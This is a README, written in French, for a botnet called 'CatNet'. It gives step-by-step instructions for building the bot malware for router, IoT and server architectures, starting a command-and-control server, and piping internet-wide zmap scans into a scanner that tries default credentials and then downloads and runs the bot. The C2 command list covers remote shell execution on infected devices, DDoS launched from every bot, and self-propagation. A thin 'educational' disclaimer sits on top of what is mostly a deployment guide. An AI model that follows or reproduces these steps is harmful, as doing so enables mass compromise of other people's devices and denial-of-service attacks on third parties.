# CatNet Botnet

![CatNet Logo](https://img.shields.io/badge/CatNet-Botnet-red)

## Description

CatNet est un botnet modulaire conçu à des fins éducatives et de recherche en sécurité informatique. Il comprend trois composants principaux :

1. **C2 Server (simple_c2.py)** : Serveur de commande et contrôle qui gère les bots infectés
2. **Bot (bot.c)** : Malware qui s'exécute sur les appareils infectés et se connecte au C2
3. **Scanner (fiber.go)** : Outil qui recherche des appareils vulnérables et les infecte avec le bot

> ⚠️ **AVERTISSEMENT** : Ce code est fourni UNIQUEMENT à des fins éducatives et de recherche. L'utilisation de ce code pour attaquer des systèmes sans autorisation explicite est illégale et contraire à l'éthique.

## Installation automatique

Un script d'installation automatique est fourni pour configurer facilement l'ensemble du botnet :

```bash
# Cloner le dépôt
git clone https://github.com/wattsans-dc/botnet-c2-catnet.git
cd botnet-c2-catnet

# Rendre le script d'installation exécutable
chmod +x setup.sh

# Exécuter le script d'installation (nécessite les droits root)
sudo ./setup.sh
```

Le script vous demandera l'adresse IP de votre serveur C2 et configurera automatiquement tous les composants.

## Installation manuelle

Si vous préférez une installation manuelle, suivez ces étapes :

### 1. Installation des dépendances

```bash
# Mise à jour des paquets
sudo apt update

# Installation des outils de base
sudo apt install -y golang zmap screen

# Installation des compilateurs croisés
sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
sudo apt install -y gcc-sparc64-linux-gnu

# Pour la compilation 32-bit
sudo apt install -y gcc-multilib libc6-dev-i386 linux-libc-dev:i386

# Dépendances supplémentaires pour les headers manquants
sudo apt install -y libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross
sudo apt install -y libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross
sudo apt install -y libc6-dev-sparc64-cross
```

### 2. Correction pour l'erreur asm/socket.h

```bash
# Pour x86 32-bit
sudo mkdir -p /usr/i386-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/i386-linux-gnu/include/asm

# Pour les autres architectures
sudo mkdir -p /usr/mips-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/mips-linux-gnu/include/asm

sudo mkdir -p /usr/arm-linux-gnueabi/include
sudo ln -s /usr/include/asm-generic /usr/arm-linux-gnueabi/include/asm

sudo mkdir -p /usr/aarch64-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/aarch64-linux-gnu/include/asm

sudo mkdir -p /usr/powerpc-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/powerpc-linux-gnu/include/asm

sudo mkdir -p /usr/sh4-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/sh4-linux-gnu/include/asm

sudo mkdir -p /usr/m68k-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/m68k-linux-gnu/include/asm

sudo mkdir -p /usr/sparc64-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/sparc64-linux-gnu/include/asm
```

### 3. Configuration des fichiers source

Modifiez les fichiers suivants pour y mettre l'adresse IP de votre serveur C2 :

- Dans **fiber.go** : Modifiez la variable `c2ServerIP`
- Dans **bot.c** : Modifiez la définition `#define C2_SERVER`

### 4. Compilation

#### Compilation du scanner (fiber.go)

```bash
go build -o fiber fiber.go
chmod +x fiber
```

#### Compilation du bot pour différentes architectures

```bash
# MIPS (routeurs courants)
mips-linux-gnu-gcc -static -o bot.mips bot.c -D__MIPS__

# ARM (IoT, routeurs)
arm-linux-gnueabi-gcc -static -o bot.arm bot.c -D__ARM__

# ARM64 (appareils modernes)
aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c -D__ARM__

# x86 (ordinateurs 32-bit)
gcc -m32 -static -o bot.x86 bot.c

# x86_64 (ordinateurs 64-bit)
gcc -static -o bot.x86_64 bot.c

# PowerPC
powerpc-linux-gnu-gcc -static -o bot.ppc bot.c -D__PPC__

# SH4 (anciens appareils embarqués)
sh4-linux-gnu-gcc -static -o bot.sh4 bot.c

# M68K (anciens systèmes)
m68k-linux-gnu-gcc -static -o bot.m68k bot.c

# SPARC (serveurs)
sparc64-linux-gnu-gcc -static -o bot.sparc bot.c -D__SPARC__
```

## Utilisation

### Démarrage du serveur C2

```bash
# Démarrer le serveur C2 en arrière-plan avec screen
screen -dmS c2_server python3 simple_c2.py

# Pour se connecter à la session screen
screen -r c2_server
```

### Démarrage du scanner

```bash
# Démarrer le scanner sur le port 80 en arrière-plan avec screen
screen -dmS scanner_80 ./fiber 80

# Pour se connecter à la session screen
screen -r scanner_80
```

### Alimentation du scanner

Le scanner attend des adresses IP sur l'entrée standard. Vous pouvez utiliser zmap pour générer des cibles :

```bash
# Scanner le port 80 sur Internet et envoyer les résultats au scanner
zmap -p 80 | ./fiber 80

# Ou pour un scan plus ciblé
zmap -p 80 -n 10000 | ./fiber 80
```

## Commandes du serveur C2

Une fois connecté à la session screen du serveur C2, vous pouvez utiliser les commandes suivantes :

- `list` - Liste les bots connectés
- `info <id>` - Affiche les informations détaillées d'un bot
- `cmd <id> <commande>` - Exécute une commande shell sur un bot spécifique
- `broadcast <commande>` - Exécute une commande sur tous les bots
- `ddos <id> <cible:port> <durée>` - Lance une attaque DDoS depuis un bot
- `ddos-all <cible:port> <durée>` - Lance une attaque DDoS depuis tous les bots
- `scan <id> <sous-réseau>` - Scanne un sous-réseau depuis un bot
- `propagate <id> <cible>` - Propage le bot à une nouvelle cible
- `ping <id>` - Vérifie si un bot est toujours actif
- `ping-all` - Vérifie tous les bots
- `kill <id>` - Déconnecte un bot
- `exit` - Quitte le serveur

## Remerciements

Un grand merci à !Dalas pour le code du scanner de bot qui a servi de base pour le développement de ce projet.

## Architecture du botnet

### Serveur C2 (simple_c2.py)

Le serveur C2 opère sur deux ports :
- **Port 1337** : Communication avec les bots infectés
- **Port 80** : Serveur HTTP pour distribuer les binaires du malware

### Bot (bot.c)

Le bot inclut les fonctionnalités suivantes :
- Connexion au serveur C2
- Exécution de commandes shell
- Attaques DDoS (plusieurs méthodes)
- Auto-propagation
- Persistance sur le système infecté

### Scanner (fiber.go)

Le scanner recherche des appareils vulnérables et tente de les infecter en :
- Testant les vulnérabilités connues
- Essayant des combinaisons d'identifiants courantes
- Téléchargeant et exécutant le malware approprié pour l'architecture cible

## Dépannage

### Problèmes de compilation

- **Erreur asm/socket.h** : Vérifiez que vous avez créé les liens symboliques comme indiqué dans la section d'installation
- **Erreurs de compilation croisée** : Assurez-vous que tous les compilateurs croisés sont installés

### Problèmes de connexion

- **Les bots ne se connectent pas** : Vérifiez que le port 1337 est ouvert dans votre pare-feu
- **Téléchargements mais pas de connexions** : Vérifiez que les binaires ont les permissions d'exécution correctes

## Licence

Ce projet est fourni à des fins éducatives uniquement. L'utilisation de ce code pour des activités illégales est strictement interdite.
